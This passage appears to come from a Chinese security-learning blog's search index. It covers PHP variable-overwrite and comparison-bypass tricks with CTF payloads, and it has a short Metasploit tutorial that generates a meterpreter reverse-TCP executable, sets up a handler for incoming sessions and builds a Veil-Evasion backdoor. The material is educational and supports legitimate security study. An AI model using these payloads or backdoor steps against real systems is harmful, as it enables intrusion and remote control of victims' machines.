class=\"string\">\"\\\\.\"</span>)</div></pre></td></tr></table></figure></p>\n","categories":[],"tags":["web安全"]},{"title":"php变量覆盖的学习","url":"http://yoursite.com/2017/03/14/php变量覆盖的学习/","content":"<h1 id=\"关于php变量覆盖漏洞：\"><a href=\"#关于php变量覆盖漏洞：\" class=\"headerlink\" title=\"关于php变量覆盖漏洞：\"></a>关于php变量覆盖漏洞：</h1><p>关注函数：extract(),parse_str(),$$,import_request_varables(),etc.</p>\n<h2 id=\"extract\"><a href=\"#extract\" class=\"headerlink\" title=\"extract():\"></a>extract():</h2><p>栗子:<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span> </div><div class=\"line\">$a = <span class=\"number\">2333</span>;</div><div class=\"line\">@extract($_GET);</div><div class=\"line\">print_r($a);</div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?a=1//即可覆盖$a</code></p>\n<h2 id=\"parse-str\"><a href=\"#parse-str\" class=\"headerlink\" title=\"parse_str():\"></a>parse_str():</h2><p>栗子:<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">$a=<span class=\"number\">2333</span>;</div><div class=\"line\">parse_str($_SERVER[<span class=\"string\">'QUERY_STRING'</span>]);</div><div class=\"line\"><span class=\"keyword\">print</span> $a;</div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?a=1//即可覆盖$a</code></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"$$:\"></a>$$:</h2><p>栗子:<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span> </div><div class=\"line\">$a = <span class=\"number\">2333</span>;</div><div class=\"line\"><span class=\"keyword\">foreach</span>(<span class=\"keyword\">array</span>(<span class=\"string\">'_COOKIE'</span>,<span class=\"string\">'_POST'</span>,<span class=\"string\">'_GET'</span>) <span class=\"keyword\">as</span> $_request)&#123;</div><div class=\"line\">\t<span class=\"keyword\">foreach</span>($$_request <span class=\"keyword\">as</span> $_key=&gt;$_value)&#123;</div><div class=\"line\">\t\t$$_key = addslashes($_value);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">print_r($a)</div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?a=1//即可覆盖$a</code></p>\n","categories":[],"tags":["php"]},{"title":"关于php比较运算符","url":"http://yoursite.com/2017/02/28/关于php比较运算符/","content":"<h1 id=\"比较运算符”-”与”-”的学习：\"><a href=\"#比较运算符”-”与”-”的学习：\" class=\"headerlink\" title=\"比较运算符”==”与”===”的学习：\"></a>比较运算符”==”与”===”的学习：</h1><h2 id=\"关于”-”的绕过：\"><a href=\"#关于”-”的绕过：\" class=\"headerlink\" title=\"关于”==”的绕过：\"></a>关于”==”的绕过：</h2><p>0e开头的全部相等<br>栗子:<br><code>md5(&#39;240610708&#39;) == md5(&#39;QNKCDZO&#39;)</code><br><code>md5(&#39;aabg7XSs&#39;) == md5(&#39;aabC9RqS&#39;)</code><br><code>sha1(&#39;aaroZmOk&#39;) == sha1(&#39;aaK1STfY&#39;)</code><br><code>sha1(&#39;aaO8zKZF&#39;) == sha1(&#39;aa3OFF9m&#39;)</code><br><code>&#39;0010e2&#39; == &#39;1e3&#39;</code><br><code>&#39;0x1234Ab&#39; == &#39;1193131&#39;</code><br><code>&#39;0xABCdef&#39; == &#39;     0xABCdef&#39;</code><br>一道简单的CTF题目：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">$key = <span class=\"string\">\"llocdpocuzion5dcp2bindhspiccy\"</span>;</div><div class=\"line\">$flag = strcmp($key, $_GET[<span class=\"string\">'key'</span>]);</div><div class=\"line\"><span class=\"keyword\">if</span> ($flag == <span class=\"number\">0</span>) &#123;</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Welcome!\"</span>;</div><div class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Bad key!\"</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?key[]=1</code></p>\n<p>var_dump(strcmp( ‘’, array())) =&gt; NULL ⇒ NULL == 0 ⇒ Get Flag！</p>\n<h2 id=\"关于“-”的绕过：\"><a href=\"#关于“-”的绕过：\" class=\"headerlink\" title=\"关于“===”的绕过：\"></a>关于“===”的绕过：</h2><p>利用数组绕过</p>\n<p>一道简单的CTF题目：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'name'</span>]) <span class=\"keyword\">and</span> <span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'password'</span>])) &#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'name'</span>] == $_GET[<span class=\"string\">'password'</span>])</div><div class=\"line\">\t\t<span class=\"keyword\">print</span> <span class=\"string\">'Your password can not be your name.'</span>;</div><div class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (sha1($_GET[<span class=\"string\">'name'</span>]) === sha1($_GET[<span class=\"string\">'password'</span>]))</div><div class=\"line\">\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Flag: '</span>.$flag);</div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?name[]=1&amp;password[]=2</code></p>\n","categories":[],"tags":["php"]},{"title":"msf 初体验","url":"http://yoursite.com/2017/02/06/msf初体验/","content":"<h1 id=\"msf简单使用：-以windows-meterpreter-reverse-tcp为例\"><a href=\"#msf简单使用：-以windows-meterpreter-reverse-tcp为例\" class=\"headerlink\" title=\"msf简单使用：(以windows/meterpreter/reverse_tcp为例)\"></a>msf简单使用：(以windows/meterpreter/reverse_tcp为例)</h1><h2 id=\"1-payload设置：\"><a href=\"#1-payload设置：\" class=\"headerlink\" title=\"1.payload设置：\"></a>1.payload设置：</h2><p>新开终端<br><code>msfvenom -l</code><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件</code></p>\n<h2 id=\"2-监听：\"><a href=\"#2-监听：\" class=\"headerlink\" title=\"2.监听：\"></a>2.监听：</h2><p>进入metasploit<br><code>use exploit/multi/handler</code><br><code>show options</code></p>\n<h2 id=\"3-插入攻击荷载\"><a href=\"#3-插入攻击荷载\" class=\"headerlink\" title=\"3.插入攻击荷载\"></a>3.插入攻击荷载</h2><p>show payloads<br><code>set payload windows/meterpreter_reverse_tcp</code><br>再次show options(出现LHOST和LPORT选项)<br><code>set lhost 192.168.1.120</code><br><code>set lport 4444</code></p>\n<h2 id=\"4-使用run-或者-exploit-启动攻击\"><a href=\"#4-使用run-或者-exploit-启动攻击\" class=\"headerlink\" title=\"4.使用run 或者 exploit 启动攻击\"></a>4.使用run 或者 exploit 启动攻击</h2><p>等待被攻击主机中招，即可拿到session<br>使用jobs停止攻击<br><code>sessions -l  //获取session列表</code><br><code>sessions -i 1 //进入meterpreter</code></p>\n<p>==============================</p>\n<h1 id=\"PS\"><a href=\"#PS\" class=\"headerlink\" title=\"PS:\"></a>PS:</h1><h2 id=\"使用veil-veasion生成后门：\"><a href=\"#使用veil-veasion生成后门：\" class=\"headerlink\" title=\"使用veil-veasion生成后门：\"></a>使用veil-veasion生成后门：</h2><p>打开终端<br><code>veil-veasion</code><br><code>list</code><br><code>use 6 //以c为例</code></p>\n<p>生成的后台地址：<br><code>/var/lib/veil-evasion/output/compiled/payload.exe</code></p>\n<p>在msf中使用：<br><code>msfconsole -r /var/lib/veil-evasion/output/handlers/payload_handler.rc</code></p>\n","categories":[],"tags":["metasploit"]},{"title":"Hello World","url":"http://yoursite.com/2017/01/14/hello world/","content":"<p>寒假宅在家里无聊搭了这个博客,以后有空会在上面分享一些东西吧。</p>\n<p>随便写写说的好像有人会来看的样子。。。</p>\n","categories":[],"tags":[]},{"title":"about","url":"http://yoursite.com/about/index.html","content":"<p>Cdut, 1996, Summer.<br>左手coding, 右手hacking. 是代码菜鸡, 也是脚本小子.<br>剑未配妥, 出门已是江湖…</p>\n<p>CVE:<br>[CVE-2018-10073] XSS in joyplus CMS</p>\n","categories":[],"tags":[]},{"title":"category","url":"http://yoursite.com/category/index.html","content":"","categories":[],"tags":[]},{"title":"link","url":"http://yoursite.com/link/index.html","content":"","categories":[],"tags":[]},{"title":"project","url":"http://yoursite.com/project/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://yoursite.com/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://yoursite.com/tag/index.html","content":"","categories":[],"tags":[]}]